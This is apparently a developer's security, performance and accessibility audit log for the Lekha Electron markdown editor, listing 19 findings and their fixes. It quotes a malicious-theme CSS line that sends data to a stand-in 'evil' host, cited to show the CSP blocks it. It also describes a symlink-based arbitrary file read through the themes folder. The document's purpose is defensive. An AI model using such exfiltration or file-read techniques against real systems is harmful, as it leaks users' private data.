# Hardening Rounds - Security / Performance / Live-Usage

Tracks the audit phase (campaign item 4): adversarially-verified findings from
parallel review workflows and the fix decisions (fixed / wontfix + why).

## Baseline security posture (verified, already in place)

- Electron: `contextIsolation: true`, `sandbox: true`, `nodeIntegration: false`
  (src/main/window.ts); allow-listed `window.lekha` preload bridge.
- CSP (src/main/index.ts CSP_DIRECTIVES): `default-src 'self'`,
  `script-src 'self'`, `connect-src 'self'`, `img-src 'self' data: file: blob:`
  (no remote http), `object-src 'none'`, `frame-src 'none'`. This already
  neutralizes the main custom-theme risk: a malicious user theme's
  `background: url(http://evil/?data)` is blocked (img-src has no http) and
  `fetch`/beacon is blocked (connect-src 'self'). Theme CSS is injected via
  `textContent` (no HTML parse) and `</style>` is escaped.

## Audit round log

(Findings + decisions appended per round below.)

## Round 1 - parallel audit (workflow wf_91e1cd9f-769, 55 agents, 19 confirmed)

1. **[HIGH/ux-a11y]** Sidebar tab buttons missing :focus-visible styles
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/renderer/components/Sidebar.tsx:118-147
   - fix: Add .sidebar__tab-btn:focus-visible rule to global.css (around line 182) with matching or stronger visual feedback compared to hover state. Example: `border-radius: 4px; outline: 2px solid var(--color

2. **[MEDIUM/sec-themes]** Symlink Following Leading to Arbitrary File Read
   - file: src/main/userThemes.ts:82-89
   - fix: Use lstat() instead of stat() to detect symlinks without following them: const info = await lstat(filePath); if (!info.isFile()) continue; // this now correctly rejects symlinks

3. **[MEDIUM/perf-render]** Per-keystroke markdown mirroring to documentsStore.updateActive causes full documents array re-render
   - file: src/renderer/App.tsx:363
   - fix: Instead of calling updateActive on every keystroke, debounce it (e.g. 500ms) to batch markdown snapshots. Keep immediate updates for `isDirty` flag but defer markdown syncing to inactive tab snapshots

4. **[MEDIUM/perf-render]** TabBar re-renders on every keystroke due to unshallow-compared `documents` and `activeId` selectors
   - file: src/renderer/components/TabBar.tsx:24-25
   - fix: Combine the two selectors into a single shallow-comparable object: `useDocumentsStore(useShallow((s) => ({ documents: s.documents, activeId: s.activeId })))` if zustand provides useShallow, OR refacto

5. **[MEDIUM/perf-render]** Sidebar and FileTree components re-render on keystroke due to fileTree and rootFolder selector changes
   - file: src/renderer/components/Sidebar.tsx:61-62 + src/renderer/App.tsx:197-198
   - fix: Wrap FileTreeNode in React.memo and make its onSelect, onToggleExpand, and other callbacks stable (memoize them in FileTree). Also consider combining the two workspace selectors into a single object w

6. **[MEDIUM/ux-a11y]** Tab strip lacking keyboard navigation support
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/renderer/components/TabBar.tsx:30-83
   - fix: Add onKeyDown handler to the role="tablist" container to handle ArrowLeft/ArrowRight keys, cycling focus between tabs and calling onSelect(). Each tab should also have tabIndex={isActive ? 0 : -1} so

7. **[MEDIUM/ux-a11y]** StatusBar buttons missing :focus-visible indicator
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/renderer/components/StatusBar.tsx:40-65
   - fix: Add .status-bar__counts:focus-visible and .status-bar__mode-btn:focus-visible rules to global.css with box-shadow: var(--focus-ring) and border-radius: 3px to match the padding and rounded corner trea

8. **[MEDIUM/ux-a11y]** Dialog buttons missing :focus-visible styling
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/renderer/styles/global.css:677-700
   - fix: Add .dialog-btn:focus-visible rule after line 690 with `outline: 2px solid var(--color-accent); outline-offset: 2px;` or `box-shadow: var(--focus-ring);` to make focus visible for keyboard users.

9. **[MEDIUM/ux-a11y]** Outline custom button span lacks proper focus styling
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/renderer/components/Outline.tsx:52-63
   - fix: Add .outline__item:focus-visible rule in global.css after line 598 with `outline: 2px solid var(--color-accent); outline-offset: -2px;` or `box-shadow: inset 0 0 0 2px var(--color-accent);` for contra

10. **[MEDIUM/ux-a11y]** FileTree rows lacking visible keyboard focus indicator
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/renderer/components/FileTree.tsx:160-190
   - fix: Add .file-tree__row:focus-visible rule in global.css after line 434 with `outline: 2px solid var(--color-accent); outline-offset: -2px;` to match the file tree's visual style while providing keyboard

11. **[MEDIUM/ux-a11y]** Focus return on dialog close not managed
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/renderer/components/RenameDialog.tsx:60-102, GetInfoDialog.tsx:60-93, LinkDialog.tsx:96-186, ImageDialog.tsx:73-131
   - fix: Store a ref to the previously focused element before the dialog opens (via useEffect when open becomes true), and restore focus to that element in the cleanup function when the dialog closes. Alternat

12. **[MEDIUM/ux-a11y]** CommandPalette role="combobox" semantics may be incorrect
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/renderer/components/CommandPalette.tsx:205-219
   - fix: Minor: Change aria-expanded={rows.length > 0} to better reflect the semantic state, or add a comment explaining why aria-expanded is always true. This is a minor semantics refinement and not a breakin

13. **[MEDIUM/ux-flows]** No error feedback when file open fails in tab workflow
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/renderer/hooks/useFileOps.ts:305
   - fix: Wrap the readFile and loadInto calls in useFileOps.openPath() with try/catch. On error, display a user-facing notification (e.g., window.alert or a toast component if available) with the error message

14. **[MEDIUM/ux-flows]** Closing last tab closes the window or shows stray blank tab; behavior is non-obvious
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/renderer/hooks/useFileOps.ts:351-370
   - fix: Consider: (1) documenting this behavior in the UI (status bar hint or tooltip on the close button), (2) showing a confirmation when closing the last tab ('Close this window or create a new document?')

15. **[MEDIUM/ux-flows]** Theme menu radio checks not updated on custom theme removal
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/main/menu.ts:64-84
   - fix: When reloadThemes() completes, check if the current theme id is still in the returned list. If not, auto-switch to 'github', persist the change, rebuild the menu, and show a brief notification ('Activ

16. **[LOW/sec-electron]** Missing X-Content-Type-Options header in CSP configuration
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/main/index.ts:280
   - fix: Add 'X-Content-Type-Options': ['nosniff'] to the responseHeaders object in the onHeadersReceived callback. Also consider adding X-Frame-Options: DENY and X-XSS-Protection headers for defense-in-depth.

17. **[LOW/perf-engine]** Repeated MarkdownIt instantiation for error rendering
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/renderer/export/buildHtml.ts:181
   - fix: Move the `.utils.escapeHtml()` call outside the loop or cache a single MarkdownIt instance at module level, or use a lightweight HTML escape function (4 regex replaces, per lines 320-325 in the same f

18. **[LOW/ux-flows]** Silent failure when reloading custom themes with syntax errors
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/renderer/hooks/useCommands.ts:220
   - fix: Add .catch() handler to the reloadThemes promise that displays an error message to the user (e.g., window.alert('Failed to reload themes: ' + error.message)). Also consider a brief success message to

19. **[LOW/ux-flows]** Unsaved changes in inactive tabs are not visually distinct from active tab
   - file: /Users/mocarram/Documents/Programming/myapps/vibeCoded/Lekha/src/renderer/components/TabBar.tsx:32-70
   - fix: Make the dirty dot always visible (do not hide it on hover). Alternatively, add a visual indicator (e.g., background tint, border, or badge count) to the tab bar itself to show the number of dirty doc

### Wave 26 - FIXED: a11y focus-visible (findings 1, 7, 8, 9, 10)
Added :focus-visible rules in global.css for .sidebar__tab-btn, .status-bar__counts/.status-bar__mode-btn, .dialog-btn, .outline__item, .file-tree__row (box-shadow var(--focus-ring) for radiused controls; inset outline for rows). +6 structural tests.

### Wave 27 - FIXED: security (findings 2, 16)
- (2) userThemes.listUserThemes now uses lstat (not stat) so a *.css SYMLINK is rejected (isFile() false) before readFile - prevents arbitrary file read via the themes folder. +1 test (symlink to a secret is skipped, content never surfaces).
- (16) Added X-Content-Type-Options: nosniff + X-Frame-Options: DENY response headers alongside the CSP (defense-in-depth).
